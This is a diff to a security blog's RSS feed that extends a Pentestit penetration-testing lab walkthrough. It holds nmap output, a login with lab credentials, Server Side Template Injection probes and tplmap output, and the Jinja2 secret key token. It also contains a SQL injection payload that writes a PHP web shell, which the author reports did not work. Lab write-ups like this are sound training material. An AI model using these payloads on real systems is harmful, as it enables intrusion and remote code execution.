@@ -6,8 +6,8 @@
 </description>
     <link>http://snoopysecurity.github.io/</link>
     <atom:link href="http://snoopysecurity.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 06 May 2019 17:09:15 +0100</pubDate>
-    <lastBuildDate>Mon, 06 May 2019 17:09:15 +0100</lastBuildDate>
+    <pubDate>Sat, 18 May 2019 20:38:12 +0100</pubDate>
+    <lastBuildDate>Sat, 18 May 2019 20:38:12 +0100</lastBuildDate>
     <generator>Jekyll v3.2.1</generator>
     
       <item>
@@ -740,7 +740,112 @@ sviridov@lomonosov:/home/TEST/sidorov$
 
 &lt;p&gt;&lt;img src=&quot;/assets/pentestit/21.jpg&quot; alt=&quot;alt text&quot; title=&quot;site1&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Other payloads such as “UNION ALL SELECT 1,”&lt;?php echo shell_exec($_GET['cmd'])?&gt;“,3,4,5,6,7,8,9,10,11 into OUTFILE  ‘/var/www/shell.php’ #” was tried to execute code on the system through SQL Injection but this was found to be not possible.&lt;/p&gt;
+&lt;p&gt;Other payloads such as &lt;code class=&quot;highlighter-rouge&quot;&gt;UNION ALL SELECT 1,&amp;lt;?php echo shell_exec($_GET['cmd'])?&amp;gt;,3,4,5,6,7,8,9,10,11 into OUTFILE  '/var/www/shell.php' #&lt;/code&gt; was tried to execute code on the system through SQL Injection but this was found to be not possible.&lt;/p&gt;
+
+&lt;h3 id=&quot;my-token&quot;&gt;My Token&lt;/h3&gt;
+
+&lt;p&gt;Looking at the previously obtained DNS names from the DNS token, the following IP address corresponds to my.test.lab.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;my.test.lab.		21600	IN	A	172.16.0.10
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;A quick nmap reveals a web server to be present on port 80.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# nmap -sS -n 172.16.0.10
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-09 18:14 EDT
+Nmap scan report for 172.16.0.10
+Host is up (0.060s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
+root@kali:~/Downloads# 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Visiting the webserver using a web browser shows the following login page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/22.jpg&quot; alt=&quot;alt text&quot; title=&quot;my1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It was possible to login to this web application using the previously found ‘info’ credentials with the password ‘123456789’.&lt;/p&gt;
+
+&lt;p&gt;After examining the page, it looks like the application is vulnerable to Server Side Template Injection (SSTI). Server Side Template Injection is possible when an attacker injects template directive as user input that can execute arbitrary code on the server. Some popular and widely used template engines are Smarty, Twig, Jinja2, FreeMarker, Velocity. More information regarding this vulnerability can be found here: https://portswigger.net/blog/server-side-template-injection&lt;/p&gt;
+
+&lt;p&gt;Presence of this vulnerability can be successfully identified by inserting a payload such as ‘{{11*2}}’ which evaluates to 22.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/23.jpg&quot; alt=&quot;alt text&quot; title=&quot;my2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The tool tplmap was used to quickly exploit this vulnerability however that was found to be not possible.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/tplmap# ./tplmap.py -u 'http://my.test.lab/?q=kk'
+[+] Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+[+] Testing if GET parameter 'q' is injectable
+[+] Smarty plugin is testing rendering with tag '*'
+[+] Smarty plugin is testing blind injection
+[+] Mako plugin is testing rendering with tag '${*}'
+[+] Mako plugin is testing blind injection
+[+] Python plugin is testing rendering with tag 'str(*)'
+[+] Python plugin is testing blind injection
+[+] Tornado plugin is testing rendering with tag ''
+[+] Tornado plugin is testing blind injection
+[+] Jinja2 plugin is testing rendering with tag ''
+[+] Jinja2 plugin is testing blind injection
+[+] Twig plugin is testing rendering with tag ''
+[+] Twig plugin is testing blind injection
+[+] Freemarker plugin is testing rendering with tag '*'
+[+] Freemarker plugin is testing blind injection
+[+] Velocity plugin is testing rendering with tag '*'
+[+] Velocity plugin is testing blind injection
+[+] Slim plugin is testing rendering with tag '&quot;#{*}&quot;'
+[+] Slim plugin is testing blind injection
+[+] Erb plugin is testing rendering with tag '&quot;#{*}&quot;'
+[+] Erb plugin is testing blind injection
+[+] Pug plugin is testing rendering with tag '\n= *\n'
+[+] Pug plugin is testing blind injection
+[+] Nunjucks plugin is testing rendering with tag ''
+[+] Nunjucks plugin is testing blind injection
+[+] Dot plugin is testing rendering with tag ''
+[+] Dot plugin is testing blind injection
+[+] Dust plugin is testing rendering
+[+] Dust plugin is testing blind injection
+[+] Marko plugin is testing rendering with tag '${*}'
+[+] Marko plugin is testing blind injection
+[+] Javascript plugin is testing rendering with tag '*'
+[+] Javascript plugin is testing blind injection
+[+] Php plugin is testing rendering with tag '*'
+[+] Php plugin is testing blind injection
+[+] Ruby plugin is testing rendering with tag '&quot;#{*}&quot;'
+[+] Ruby plugin is testing blind injection
+[+] Ejs plugin is testing rendering with tag '*'
+[+] Ejs plugin is testing blind injection
+[!][checks] Tested parameters appear to be not injectable
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;By reading through the great methodology given by James Kettle of Portswigger (https://portswigger.net/blog/server-side-template-injection), the following can be done to identify what template is in use.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png&quot; alt=&quot;alt text&quot; title=&quot;my3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By following the above methodology, it is possible to identify that the template in use in Jinja2 since it evaluates ‘{{7*‘7’}}’ to 7777777.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/24.jpg&quot; alt=&quot;alt text&quot; title=&quot;my2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Knowing that, enumeration of the application can now begin. The following global variables are available within Jinja2 templates by default:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;config&lt;/code&gt; - the current configuration object&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;request&lt;/code&gt; - the current request object&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;session&lt;/code&gt; - the current session object&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;g&lt;/code&gt; - the request-bound object for global variables. This is usually used by the developer to store resources during a request.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The configuration object can be called to retrieve the secret key used by the Jinja template. The Secret Key ‘UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==’ is the My token.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pentestit/25.jpg&quot; alt=&quot;alt text&quot; title=&quot;my4&quot; /&gt;&lt;/p&gt;
+
 </description>
         <pubDate>Mon, 21 Jan 2019 09:00:00 +0000</pubDate>
         <link>http://snoopysecurity.github.io/netsec/2019/01/21/10_pentestit_v12_walkthrough.html</link>
